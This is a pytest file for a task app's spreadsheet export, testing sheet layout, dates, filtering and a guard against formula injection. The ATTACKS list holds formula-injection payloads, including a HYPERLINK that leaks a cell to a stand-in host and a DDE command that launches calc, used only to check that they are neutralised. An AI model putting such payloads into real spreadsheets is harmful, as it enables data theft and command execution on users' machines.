"""The task spreadsheet (`services/export_workbook.py`, issue #326): opened with openpyxl and
checked sheet by sheet, the formula guard included (read from the raw XML too: no cell is ever a
formula)."""

import io
import zipfile
from datetime import UTC, date, datetime, time

import pytest
from openpyxl import load_workbook

from ..models import Label, Priority, Project, Resolution, Section, TaskState
from ..services.export_workbook import (
    CELL_MAX,
    COMMENT_COLUMNS,
    TASK_COLUMNS,
    WORKBOOK_NAME,
    FileListing,
    write_workbook,
)
from .factories import created, make_comment, make_label, make_task, utc

pytestmark = [pytest.mark.django_db, pytest.mark.unit]


def build(user, *, start=None, end=None, files=None, as_of=None) -> io.BytesIO:
    target = io.BytesIO()
    write_workbook(target, user, start=start, end=end, files=files or FileListing(), as_of=as_of)
    target.seek(0)
    return target


def sheets(user, **kwargs):
    workbook = load_workbook(build(user, **kwargs))
    return workbook['Tasks'], workbook['Comments'], workbook


def rows(sheet) -> list[list]:
    return [[cell.value for cell in row] for row in sheet.iter_rows()][1:]


def column(sheet, name: str) -> list:
    header = [cell.value for cell in sheet[1]]
    index = header.index(name)
    return [row[index].value for row in sheet.iter_rows(min_row=2)]


def test_the_workbook_is_called_tasks_xlsx():
    assert WORKBOOK_NAME == 'tasks.xlsx'


class TestSheets:
    def test_two_sheets_in_order_with_the_headers(self, user):
        tasks, comments, workbook = sheets(user)
        assert workbook.sheetnames == ['Tasks', 'Comments']
        assert [cell.value for cell in tasks[1]] == [name for name, _ in TASK_COLUMNS]
        assert [cell.value for cell in comments[1]] == [name for name, _ in COMMENT_COLUMNS]
        assert [c for c, _ in TASK_COLUMNS] == [
            'Number',
            'Title',
            'Description',
            'State',
            'Resolution',
            'Priority',
            'Due date',
            'Due time',
            'Project',
            'Section',
            'Labels',
            'Parent',
            'Created',
            'Closed',
            'Comments',
            'Files',
        ]

    def test_an_empty_range_is_just_the_headers(self, user):
        tasks, comments, _ = sheets(user)
        assert rows(tasks) == [] and rows(comments) == []

    def test_the_header_is_bold_and_frozen_and_the_columns_have_widths(self, user):
        make_task(user)
        tasks, comments, _ = sheets(user)
        for sheet, columns in ((tasks, TASK_COLUMNS), (comments, COMMENT_COLUMNS)):
            assert sheet.freeze_panes == 'A2'
            assert all(cell.font.bold for cell in sheet[1])
            widths = [sheet.column_dimensions[chr(65 + i)].width for i in range(len(columns))]
            assert widths == [width for _, width in columns]


class TestTasks:
    def test_a_full_row(self, user):
        user.timezone = 'Pacific/Auckland'
        user.save()
        project = Project.objects.create(user=user, name='Home')
        section = Section.objects.create(project=project, name='Soon')
        parent = make_task(user, number=7000, title='Parent')
        urgent = make_label(user, 'Urgent', position=2)
        errands = make_label(user, 'Errands', position=1)
        task = make_task(
            user,
            number=7001,
            title='Pay the rent',
            description='Before **Friday**',
            priority=Priority.P2,
            state=TaskState.IN_PROGRESS,
            due_date=date(2026, 11, 20),
            due_time=time(9, 30),
            project=project,
            section=section,
            parent=parent,
            labels=[urgent, errands],
        )
        # 2026-10-31 23:30 UTC is already 1 November, 12:30, in Auckland (UTC+13).
        created(task, utc(2026, 10, 31, 23, 30))
        make_comment(task, 'one')
        make_comment(task, 'two')

        tasks, _, _ = sheets(user)
        [first, second] = rows(tasks)
        assert first[:2] == [7000, 'Parent']
        assert second == [
            7001,
            'Pay the rent',
            'Before **Friday**',
            'In progress',
            None,
            'Priority 2',
            datetime(2026, 11, 20),
            time(9, 30),
            'Home',
            'Soon',
            'Errands, Urgent',
            7000,
            datetime(2026, 11, 1, 12, 30),
            None,
            2,
            None,
        ]

    def test_a_closed_task_says_closed_and_how(self, user):
        done = make_task(user, number=7001, completed_at=utc(2026, 11, 2, 8, 0))
        wont = make_task(
            user, number=7002, completed_at=utc(2026, 11, 3), resolution=Resolution.WONT_DO
        )
        tasks, _, _ = sheets(user)
        assert column(tasks, 'State') == ['Closed', 'Closed']
        assert column(tasks, 'Resolution') == ['Done', "Won't do"]
        assert column(tasks, 'Closed') == [datetime(2026, 11, 2, 8, 0), datetime(2026, 11, 3, 0, 0)]
        assert done and wont

    def test_an_open_task_has_no_resolution_or_close_date(self, user):
        make_task(user, state=TaskState.ON_HOLD)
        tasks, _, _ = sheets(user)
        assert column(tasks, 'State') == ['On hold']
        assert column(tasks, 'Resolution') == [None] and column(tasks, 'Closed') == [None]

    def test_dates_and_times_are_real_spreadsheet_dates(self, user):
        make_task(user, due_date=date(2026, 11, 20), due_time=time(9, 5))
        tasks, _, _ = sheets(user)
        header = [cell.value for cell in tasks[1]]
        row = tasks[2]
        assert row[header.index('Due date')].is_date
        assert row[header.index('Due date')].number_format == 'yyyy-mm-dd'
        assert row[header.index('Due time')].number_format == 'hh:mm'
        assert row[header.index('Created')].is_date
        assert row[header.index('Created')].number_format == 'yyyy-mm-dd hh:mm'
        assert row[header.index('Number')].data_type == 'n'

    def test_created_is_the_users_wall_clock(self, user):
        task = make_task(user)
        created(task, utc(2026, 11, 1, 3, 15))
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Created') == [datetime(2026, 11, 1, 3, 15)]
        user.timezone = 'America/Los_Angeles'  # UTC-7 on 1 Nov 2026 03:15 UTC (PDT ends on the 1st)
        user.save()
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Created') == [datetime(2026, 10, 31, 20, 15)]

    def test_subtasks_and_every_state_are_included_in_number_order(self, user):
        parent = make_task(user, number=7001)
        make_task(user, number=7003, parent=parent)
        make_task(user, number=7002, state=TaskState.BLOCKED)
        make_task(user, number=7000, completed_at=utc(2026, 11, 1))
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Number') == [7000, 7001, 7002, 7003]
        assert column(tasks, 'Parent') == [None, None, None, 7001]

    def test_the_trash_and_other_users_are_left_out(self, user, other_user):
        make_task(user, number=7001)
        make_task(user, number=7002, deleted_at=utc(2026, 11, 1))
        make_task(other_user, number=7003)
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Number') == [7001]

    def test_the_range_bounds_are_inclusive_at_the_start_and_exclusive_at_the_end(self, user):
        for number, when in [
            (7001, utc(2026, 10, 31, 23, 59)),
            (7002, utc(2026, 11, 1, 0, 0)),
            (7003, utc(2026, 11, 30, 23, 59)),
            (7004, utc(2026, 12, 1, 0, 0)),
        ]:
            created(make_task(user, number=number), when)
        tasks, _, _ = sheets(user, start=utc(2026, 11, 1), end=utc(2026, 12, 1))
        assert column(tasks, 'Number') == [7002, 7003]
        tasks, _, _ = sheets(user, start=utc(2026, 11, 1))
        assert column(tasks, 'Number') == [7002, 7003, 7004]
        tasks, _, _ = sheets(user, end=utc(2026, 11, 1))
        assert column(tasks, 'Number') == [7001]

    def test_a_task_created_after_the_export_was_asked_for_is_left_out(self, user):
        created(make_task(user, number=7001), utc(2026, 11, 1))
        created(make_task(user, number=7002), utc(2026, 11, 3))
        tasks, _, _ = sheets(user, as_of=utc(2026, 11, 2))
        assert column(tasks, 'Number') == [7001]

    def test_the_comment_count_leaves_deleted_comments_out(self, user):
        task = make_task(user)
        make_comment(task, 'kept')
        make_comment(task, 'gone', deleted_at=utc(2026, 11, 1))
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Comments') == [1]

    def test_the_files_column_lists_one_line_per_file_sorted(self, user):
        task = make_task(user)
        files = FileListing()
        files.add(task.pk, None, 'b/zeta.pdf (part 2)')
        files.add(task.pk, None, 'a/Alpha.pdf (part 1)')
        tasks, _, _ = sheets(user, files=files)
        assert column(tasks, 'Files') == ['a/Alpha.pdf (part 1)\nb/zeta.pdf (part 2)']

    def test_a_task_with_no_labels_project_or_files_has_empty_cells(self, user):
        make_task(user)
        tasks, _, _ = sheets(user)
        for name in ('Project', 'Section', 'Labels', 'Files', 'Parent', 'Description'):
            assert column(tasks, name) == [None], name
        assert Label.objects.count() == 0

    def test_priorities(self, user):
        for number, priority in enumerate(Priority.values, start=7001):
            make_task(user, number=number, priority=priority)
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Priority') == [None, 'Priority 1', 'Priority 2', 'Priority 3']


class TestComments:
    def test_a_row_per_comment_in_task_then_time_order(self, user):
        user.timezone = 'Europe/Lisbon'
        user.save()
        first = make_task(user, number=7001, title='First')
        second = make_task(user, number=7002, title='Second')
        make_comment(second, 'on second', created_at=utc(2026, 11, 1, 9))
        late = make_comment(first, 'late', created_at=utc(2026, 11, 3, 9))
        make_comment(first, 'early', created_at=utc(2026, 11, 2, 9))
        late.edited_at = utc(2026, 11, 4, 12)
        late.save()

        _, comments, _ = sheets(user)
        assert rows(comments) == [
            [7001, 'First', datetime(2026, 11, 2, 9), None, 'early', None],
            [7001, 'First', datetime(2026, 11, 3, 9), datetime(2026, 11, 4, 12), 'late', None],
            [7002, 'Second', datetime(2026, 11, 1, 9), None, 'on second', None],
        ]

    def test_the_comment_is_its_markdown_as_typed(self, user):
        make_comment(make_task(user), '**bold**\n\n- [ ] one\n- [x] two')
        _, comments, _ = sheets(user)
        assert column(comments, 'Comment') == ['**bold**\n\n- [ ] one\n- [x] two']

    def test_a_comment_that_starts_with_a_bullet_gets_the_guards_apostrophe(self, user):
        # The price of the formula guard: a text that begins with `-` (a Markdown list) is
        # prefixed, like in the CSV exports. It is still a string cell, so nothing can run.
        make_comment(make_task(user), '- [ ] one\n- [x] two')
        _, comments, _ = sheets(user)
        assert column(comments, 'Comment') == ["'- [ ] one\n- [x] two"]

    def test_deleted_comments_and_revisions_are_left_out(self, user):
        task = make_task(user)
        make_comment(task, 'kept')
        make_comment(task, 'deleted', deleted_at=utc(2026, 11, 1))
        edited = make_comment(task, 'new text')
        edited.revisions.create(body='old text', replaced_at=utc(2026, 11, 2))
        _, comments, _ = sheets(user)
        assert sorted(column(comments, 'Comment')) == ['kept', 'new text']

    def test_a_comment_on_a_task_in_the_trash_or_out_of_range_is_left_out(self, user):
        trashed = make_task(user, number=7001, deleted_at=utc(2026, 11, 1))
        old = created(make_task(user, number=7002), utc(2025, 1, 1))
        make_comment(trashed, 'trashed')
        make_comment(old, 'old')
        make_comment(make_task(user, number=7003), 'in')
        _, comments, _ = sheets(user, start=utc(2026, 1, 1))
        assert column(comments, 'Comment') == ['in']

    def test_another_users_comments_are_left_out(self, user, other_user):
        make_comment(make_task(other_user), 'theirs')
        _, comments, _ = sheets(user)
        assert rows(comments) == []

    def test_the_files_of_a_comment(self, user):
        task = make_task(user)
        comment = make_comment(task, 'with files')
        files = FileListing()
        files.add(task.pk, comment.pk, 'P/7000 - T/comments/b.pdf')
        files.add(task.pk, comment.pk, 'P/7000 - T/comments/a.pdf')
        files.add(task.pk, None, 'P/7000 - T/own.pdf')
        tasks, comments, _ = sheets(user, files=files)
        assert column(comments, 'Files') == ['P/7000 - T/comments/a.pdf\nP/7000 - T/comments/b.pdf']
        assert column(tasks, 'Files') == ['P/7000 - T/own.pdf']


ATTACKS = [
    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    '+1+1',
    '-2+3',
    '@SUM(1,1)',
    '  =1+1',
    '\t=1+1',
    "=cmd|' /C calc'!A0",
]


class TestNeverAFormula:
    @pytest.mark.parametrize('text', ATTACKS)
    def test_a_title_description_and_comment_that_look_like_formulas_are_neutralised(
        self, user, text
    ):
        task = make_task(user, title=text, description=text)
        make_comment(task, text)
        tasks, comments, _ = sheets(user)
        title = tasks['B2']
        description = tasks['C2']
        body = comments['E2']
        for cell in (title, description, body):
            assert cell.data_type == 's', cell.coordinate
            assert cell.value == "'" + text
            assert cell.value.startswith("'")

    def test_no_cell_in_the_file_is_a_formula(self, user):
        for number, text in enumerate(ATTACKS, start=7001):
            task = make_task(user, number=number, title=text, description=text, project=None)
            make_comment(task, text)
        files = FileListing()
        task = make_task(user, number=7999)
        files.add(task.pk, None, '=HYPERLINK("x")')
        raw = zipfile.ZipFile(build(user, files=files))
        for name in raw.namelist():
            if name.endswith('.xml'):
                xml = raw.read(name).decode()
                assert '<f>' not in xml and '<f ' not in xml, name

    def test_a_project_label_or_section_that_looks_like_a_formula_is_neutralised(self, user):
        project = Project.objects.create(user=user, name='=1+1')
        section = Section.objects.create(project=project, name='@x')
        label = make_label(user, '+y')
        make_task(user, project=project, section=section, labels=[label])
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Project') == ["'=1+1"]
        assert column(tasks, 'Section') == ["'@x"]
        assert column(tasks, 'Labels') == ["'+y"]

    def test_ordinary_text_is_untouched(self, user):
        make_task(user, title='1 + 1 = 2', description='a=b -- fine')
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Title') == ['1 + 1 = 2']
        assert column(tasks, 'Description') == ['a=b -- fine']

    def test_control_characters_a_spreadsheet_cannot_hold_are_dropped(self, user):
        make_task(user, title='bell\x07 and nul\x00 here', description='tab\tstays\nnewline too')
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Title') == ['bell and nul here']
        assert column(tasks, 'Description') == ['tab\tstays\nnewline too']

    def test_a_text_longer_than_a_cell_holds_is_cut(self, user):
        make_task(user, description='x' * (CELL_MAX + 500))
        tasks, _, _ = sheets(user)
        [description] = column(tasks, 'Description')
        assert len(description) == CELL_MAX

    def test_unicode_survives(self, user):
        make_task(user, title='Café ☕ 日本語 🎉')
        tasks, _, _ = sheets(user)
        assert column(tasks, 'Title') == ['Café ☕ 日本語 🎉']


def test_the_stats_count_rows(user):
    task = make_task(user)
    make_comment(task, 'a')
    make_comment(task, 'b')
    stats = write_workbook(io.BytesIO(), user, start=None, end=None, files=FileListing())
    assert (stats.tasks, stats.comments) == (1, 2)


def test_a_large_workbook_streams(user, django_assert_max_num_queries):
    for number in range(7001, 7061):
        task = make_task(user, number=number)
        make_comment(task, f'c{number}')
    with django_assert_max_num_queries(8):
        build(user)


def test_utc_user_sees_utc(user):
    created(make_task(user), datetime(2026, 11, 1, 3, 15, tzinfo=UTC))
    tasks, _, _ = sheets(user)
    assert column(tasks, 'Created') == [datetime(2026, 11, 1, 3, 15)]
